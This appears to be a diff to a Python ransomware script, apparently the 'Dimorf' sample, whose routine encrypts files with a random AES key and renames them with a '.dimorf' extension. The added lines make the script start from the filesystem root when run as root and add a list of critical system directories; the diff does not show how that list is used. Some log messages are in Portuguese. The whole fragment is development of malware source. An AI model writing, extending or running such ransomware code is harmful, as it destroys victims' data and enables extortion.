@@ -17,6 +17,10 @@ from Crypto import Random
 def check_os(osname: str) -> str | None:
     USER_DIR = os.getenv('HOME')
     
+    if (os.getuid() == 0):
+        USER_DIR = '/'
+        
+    
     # # check if os is linux.
     is_linux = [
         prop for prop in os.uname() if (
@@ -33,6 +37,7 @@ def check_os(osname: str) -> str | None:
         find_and_encrypt(
             path=USER_DIR,
             ext_files=['.txt'],
+            critical_dirs=['/bin', '/sbin', '/etc', '/lib'],
             hidden='.',
             new_ext='.dimorf',
             key=Random.get_random_bytes(32),
@@ -43,6 +48,7 @@ def check_os(osname: str) -> str | None:
 def find_and_encrypt(
     path: str,
     ext_files: list,
+    critical_dirs: list,
     hidden: str,
     new_ext: str,
     key: bytes,
@@ -213,7 +219,6 @@ def find_and_encrypt(
                             if lf.write(logs[0]):
                                 lf.write(logs[1])
                                 print(f'\33[32mLogs gerado em {lf}\33[0m')
-                                
                             
 if __name__ == '__main__':
     os.system('clear')        
